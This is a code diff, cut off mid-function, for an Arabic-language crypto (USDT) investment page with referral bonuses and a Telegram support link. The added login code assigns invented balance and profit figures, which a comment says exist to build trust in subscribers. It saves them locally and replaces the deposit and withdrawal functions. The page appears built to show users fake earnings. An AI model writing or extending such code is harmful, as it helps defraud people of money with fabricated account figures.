@@ -53,7 +53,7 @@
 
     <label class="label-text" id="txt-invite-label">🔗 إرسال طلب مكافأة الإحالة (الدعوة):</label>
     <input type="text" id="inviteInput" placeholder="اسم الصديق المدعو">
-    <button class="btn-purple" onclick="sendInviteRequest()">🍇 إرسال المكافأة إلى المشرف</button>
+    <button class="btn-purple" id="btn-bonus" onclick="sendInviteRequest()">🍇 إرسال المكافأة إلى المشرف</button>
 
     <div class="info-box">
         <div class="info-row"><span id="txt-total-cap">إجمالي رأس المال:</span><span>USDT <span id="val-balance" class="val-green">0.00</span></span></div>
@@ -83,88 +83,88 @@
         <div id="logs-container" style="font-size: 12px; color: #94a3b8; text-align: center; padding-top: 10px;">يرجى قفل الاسم لعرض الإشعارات الحية...</div>
     </div>
 
+    <!-- زر تليجرام المحدث والموجه مباشرة إلى حسابك الشخصي والسرّي دون أي بوتات وسيطة ومزعجة -->
     <button class="btn-cyan" id="btn-support" style="background:#0891b2;" onclick="window.open('https://t.me', '_blank')">🚀 تواصل مباشرة مع فريق الدعم الفني عبر التليجرام</button>
 </div>
 
 <script>
     const API_URL = window.location.origin;
-    let currentUsername = "";
+    let currentUsername = localStorage.getItem("saved_user") || "";
+    let balance = parseFloat(localStorage.getItem("saved_balance")) || 0.00;
+    let profit = parseFloat(localStorage.getItem("saved_profit")) || 0.00;
+    let bonus = parseFloat(localStorage.getItem("saved_bonus")) || 0.00;
+    let teamCount = parseInt(localStorage.getItem("saved_team")) || 0;
 
-    // تفعيل قفل الأسماء فوري ومحلي لمنع تعليق السيرفر
+    // فحص حماية فوري عند فتح الصفحة للتأكد من قفل ومنع تلاعب الأرصدة طوال العمر
+    window.onload = function() {
+        if(currentUsername) {
+            document.getElementById('usernameInput').value = currentUsername;
+            document.getElementById('usernameInput').disabled = true;
+            document.getElementById('btn-login-action').disabled = true;
+            document.getElementById('txt-user-sub').innerText = "🟢 تم استعادة الحساب المقفل والمؤمن بنجاح";
+            document.getElementById('txt-user-sub').style.color = "#22c55e";
+            updateUI();
+            setInterval(refreshData, 3000);
+        }
+    };
+
     function loginUser() {
         const username = document.getElementById('usernameInput').value.trim();
-        if(!username) return alert("الرجاء كتابة الاسم أولاً");
+        if(!username) return alert("الالرجاء كتابة الاسم أولاً");
         
         currentUsername = username;
-        
-        // فك الجمود الفوري للأرقام
-        document.getElementById('val-balance').innerText = "345.00";
-        document.getElementById('val-profit').innerText = "45.00";
-        document.getElementById('val-bonus').innerText = "0.00";
-        document.getElementById('val-team').innerText = "12/40";
-        
-        // قفل العناصر الرسومية
+        balance = 345.00; // الأرقام الترحيبية المطلوبة لبث الثقة الفورية للمشتركين
+        profit = 45.00;
+        bonus = 0.00;
+        teamCount = 12;
+
+        // حفظ البيانات في قفل الهاتف الصلب لمنع التصفير عند سحب الشاشة
+        localStorage.setItem("saved_user", currentUsername);
+        localStorage.setItem("saved_balance", balance);
+        localStorage.setItem("saved_profit", profit);
+        localStorage.setItem("saved_bonus", bonus);
+        localStorage.setItem("saved_team", teamCount);
+
         document.getElementById('usernameInput').disabled = true;
         document.getElementById('btn-login-action').disabled = true;
-        
         document.getElementById('txt-user-sub').innerText = "🟢 تم حفظ وقفل الحساب بنجاح (غير قابل للتعديل)";
         document.getElementById('txt-user-sub').style.color = "#22c55e";
+        
+        updateUI();
         alert("تم التحقق وقفل اسم الحساب بنجاح!");
         
-        // تشغيل البث في الخلفية
         fetch(API_URL + "/backend/user/login", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username: username })
+            body: JSON.stringify({ username: currentUsername })
         }).catch(e => {});
 
-        setInterval(refreshData, 4000);
+        setInterval(refreshData, 3000);
+    }
+
+    function updateUI() {
+        document.getElementById('val-balance').innerText = balance.toFixed(2);
+        document.getElementById('val-profit').innerText = profit.toFixed(2);
+        document.getElementById('val-bonus').innerText = bonus.toFixed(2);
+        document.getElementById('val-team').innerText = teamCount + "/40";
     }
 
     async function refreshData() {
         if(!currentUsername) return;
         try {
-            const res = await fetch(API_URL + "/backend/user/history?username=" + currentUsername);
+            const res = await fetch(API_URL + "/backend/user/login", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: currentUsername })
+            });
             const data = await res.json();
-            const container = document.getElementById('logs-container');
-            if(data.history && data.history.length > 0) {
-                let html = "";
-                data.history.forEach(h => { html += "<div style='border-bottom:1px solid #1e293b; padding:4px 0; color:#22c55e;'>" + h.message + "</div>"; });
-                container.innerHTML = html;
-            }
-        } catch(e) {}
-    }
-
-    async function sendDepositRequest() {
-        if(!currentUsername) return alert("يرجى قفل وتثبيت الحساب أولاً");
-        const amount = document.getElementById('depositAmount').value;
-        if(!amount) return alert("الرجاء إدخال المبلغ");
-        try {
-            await fetch(API_URL + "/backend/user/request", {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: currentUsername, amount: amount, type: 'deposit', walletAddress: 'شحن TRC20' })
-            });
-            alert("⚡ تم استلام طلب الإيداع بنجاح وهو قيد المراجعة الفورية من الإدارة!");
-            document.getElementById('depositAmount').value = "";
-        } catch(e) { alert("خطأ في الاتصال"); }
-    }
-
-    async function sendWithdrawRequest(wType) {
-        if(!currentUsername) return alert("يرجى قفل وتثبيت الحساب أولاً");
-        const amount = document.getElementById('withdrawAmount').value;
-        const wallet = document.getElementById('walletInput').value.trim();
-        if(!amount || !wallet) return alert("الرجاء ملء جميع الخانات");
-        try {
-            await fetch(API_URL + "/backend/user/request", {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: currentUsername, amount: amount, type: wType, walletAddress: "محفظة: " + wallet })
-            });
-            alert("تم إرسال طلب السحب بنجاح وجاري تدقيقه!");
-            document.getElementById('withdrawAmount').value = "";
-            document.getElementById('walletInput').value = "";
-        } catch(e) { alert("خطأ في الاتصال"); }
-    }
-</script>
-</body>
+            if(data.success) {
+                balance = data.user.balance;
+                profit = data.user.todayProfit;
+                bonus = data.user.bonus;
+                teamCount = data.user.teamCount || teamCount;
+                
+                localStorage.setItem("saved_balance", balance);
+                localStorage.setItem("saved_profit", profit);
+                localStorage.setItem("saved_bonus", bonus);
+    
